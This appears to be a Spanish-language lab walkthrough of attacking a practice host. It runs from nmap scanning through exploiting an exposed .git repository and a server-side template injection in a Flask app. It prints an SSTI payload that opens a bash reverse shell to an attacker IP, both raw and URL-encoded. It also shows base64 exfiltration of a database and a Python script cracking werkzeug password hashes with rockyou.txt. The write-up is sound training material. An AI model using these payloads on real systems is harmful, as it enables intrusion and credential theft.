#Advanced-Labs 

### Ping

```python
ping -c 1 10.13.37.14
PING 10.13.37.14 (10.13.37.14) 56(84) bytes of data.
64 bytes from 10.13.37.14: icmp_seq=1 ttl=63 time=167 ms

--- 10.13.37.14 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 166.552/166.552/166.552/0.000 ms
```

### nmap

```python
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 17:20 EDT
Nmap scan report for 10.13.37.14
Host is up (0.17s latency).
Not shown: 65524 closed tcp ports (reset), 8 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a8:05:53:ae:b1:8d:7e:90:f1:ea:81:6b:18:f6:5a:68 (RSA)
|   256 2e:7f:96:ec:c9:35:df:0a:cb:63:73:26:7c:15:9d:f5 (ECDSA)
|_  256 2f:ab:d4:f5:48:45:10:d2:3c:4e:55:ce:82:9e:22:3a (ED25519)
80/tcp   open  http            nginx 1.13.12
| http-title: Notifications
|_Requested resource was http://10.13.37.14/login?next=%2F
| http-git: 
|   10.13.37.14:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Add app logic & requirements.txt 
|_http-server-header: nginx/1.13.12
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, LSCP, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     Welcome to FaradaySEC stats!!!
|     Username: Bad chars detected!
|   NULL: 
|     Welcome to FaradaySEC stats!!!
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.94SVN%I=7%D=7/12%Time=66919E43%P=x86_64-pc-linux-gnu%r
SF:(NULL,29,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20")%r(Ge
SF:tRequest,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\
SF:x20chars\x20detected!")%r(HTTPOptions,3C,"Welcome\x20to\x20FaradaySEC\x
SF:20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(FourOhFourReques
SF:t,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20char
SF:s\x20detected!")%r(JavaRMI,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\
SF:nUsername:\x20Bad\x20chars\x20detected!")%r(LSCP,3C,"Welcome\x20to\x20F
SF:aradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Gener
SF:icLines,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x
SF:20chars\x20detected!")%r(RTSPRequest,3C,"Welcome\x20to\x20FaradaySEC\x2
SF:0stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(RPCCheck,3C,"Welc
SF:ome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detec
SF:ted!")%r(DNSVersionBindReqTCP,3C,"Welcome\x20to\x20FaradaySEC\x20stats!
SF:!!\nUsername:\x20Bad\x20chars\x20detected!")%r(DNSStatusRequestTCP,3C,"
SF:Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20d
SF:etected!")%r(Help,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername
SF::\x20Bad\x20chars\x20detected!")%r(SSLSessionReq,3C,"Welcome\x20to\x20F
SF:aradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Termi
SF:nalServerCookie,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\
SF:x20Bad\x20chars\x20detected!")%r(TLSSessionReq,3C,"Welcome\x20to\x20Far
SF:adaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(Kerbero
SF:s,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20char
SF:s\x20detected!")%r(SMBProgNeg,3C,"Welcome\x20to\x20FaradaySEC\x20stats!
SF:!!\nUsername:\x20Bad\x20chars\x20detected!")%r(X11Probe,3C,"Welcome\x20
SF:to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%
SF:r(LPDString,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20B
SF:ad\x20chars\x20detected!")%r(LDAPSearchReq,3C,"Welcome\x20to\x20Faraday
SF:SEC\x20stats!!!\nUsername:\x20Bad\x20chars\x20detected!")%r(LDAPBindReq
SF:,3C,"Welcome\x20to\x20FaradaySEC\x20stats!!!\nUsername:\x20Bad\x20chars
SF:\x20detected!");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.88 seconds
```

### Enumeración del puerto 80 (http)
parece que aqui podemos crear una cuenta para iniciar sesión 
![[Pasted image 20240712172822.png]]

`Alert system`
creamos la cuenta y luego podemos iniciar sesión
![[Pasted image 20240712172959.png]]

`Alert system`
aqui nos solicita una configuración para el servidor SMTP que recibirá alertas del sistema; Configuramos nuestro host con el puerto 25
![[Pasted image 20240712173218.png]]

seleccionamos un nombre para el servidor. en este caso lo dejo por defecto y le damos en `Send`
![[Pasted image 20240712174048.png]]

agregamos los datos que queremos para la alerta en este caso usare solo `test`
![[Pasted image 20240712174121.png]]

`flag`
después de enviar la alerta la recibimos en nuestro servidor de python en donde podemos ber la primera flag
![[Pasted image 20240712173809.png]]

### dirsearch
Vemos que existe el directorio “.git”, por lo que hay un proyecto Git abierto. Usando `git-dumper` podemos volcar todos los archivos de un proyecto ".git".
![[Pasted image 20240712175020.png]]

### git-dumper
instalamos la herramienta para poder dumpear todo el proyecto 
![[Pasted image 20240712175412.png]]

`dump_new`
aquí dumpeamos todo el proyecto para poder ejecutarlo
![[Pasted image 20240712175952.png]]

`app.py`
al leer el código del `scritp.py` puedo ver una linea que usa el `render_template_string` lo que me hace pensar que existe una vulnerabilidad así que vamos a mirarlo [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection?source=post_page-----889ef6888d79--------------------------------) 
![[Pasted image 20240712180855.png]]

### Vulnerabilidades

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad           | Tipo | Nivel | Link |
| -------------- | ------------------------------------- | ---- | ----- | ---- |
| none           | SSTI (Server Side Template Injection) | SSTI | none  | none |
|                |                                       |      |       |      |
|                |                                       |      |       |      |

Mientras leíamos el artículo sobre la vulnerabilidad, encontramos varias alternativas al uso de la ejecución de comandos. Al final nos queda el siguiente payload, el cual se encargará de ejecutar un comando que nos enviará un shell inverso con bash.

```python

{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash -c "bash -i >& /dev/tcp/ 10.10.14.18/443 0>&1"')['read']() == 'chiv' %} a {% endif %}

Nos quedara algo asi:

http://10.13.37.14/profile?name={%25+if+request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.20/443+0>%261"')['read']()+%3d%3d+'chiv'+%25}+a+{%25+endif+%25}
```

### nc -lvnp 443
al ejecutar la ruta anterior nos lleva directamente al área de reporte y aquí podemos enviar el test y estando a la escucha nos da una shell
![[Pasted image 20240712184542.png]]

### databases.db
necesitamos leer este archivo de base de datos para hacerlo de mejor manera lo vamos a encodear en base64 usando este comando y lo copiamos para enviarlo a nuestra maquina

```python
base64 -w0 database.db
```

![[Pasted image 20240712203948.png]]

`ssqlite3`
aquí debemos hacer el inverso para regresar los datos al formato `.db`  usando el siguiente comando  

```python
❯ base64 -d new-db.txt > database.db

❯ sqlite3 database.db
```

![[Pasted image 20240712204304.png]]

`vamos a seleccionar la table de user_model`
obtenemos los hash de los usuarios de la base de datos y ahora podemos intentar decodear
![[Pasted image 20240713002639.png]]

### script python
vamos a crear un script en python que sea capaz de analizar estos hashes ya que han sido creados con una librería especifica. para ello necesitamos instalar esta librería y asegurarnos que este corriendo la `versión 2.2.2` ya que las nuevas versiones no funciona 

```python
python3 -m pip install werkzeug==2.2.2 #Nota: esta es la version que necesitamos instalar ya que las versiones actualizadas no funcionan

--------------------------------------------------------------------------------------------------------------------------------------

#!/usr/bin/python3  
from werkzeug.security import check_password_hash  
  
  
hashes = open("NombreDelHash", "r")  
  
for hash in hashes:  
    hash = hash.strip()  
    user = hash.split(":")[0]  
    hash = hash.split(":")[1]  
  
    with open("rockyou.txt", "r", errors="ignore") as file:    
        for line in file:  
            password = line.strip()  
            if check_password_hash(hash, password):  
                print(f"Password found: {password}")  
                break  
else:  
    print("Password not found in the given wordlist.")

```

haciendo esto podemos encontrar 5 contraseñas las cuales no sabemos a cual usuarios pertenece
![[Pasted image 20240713113338.png]]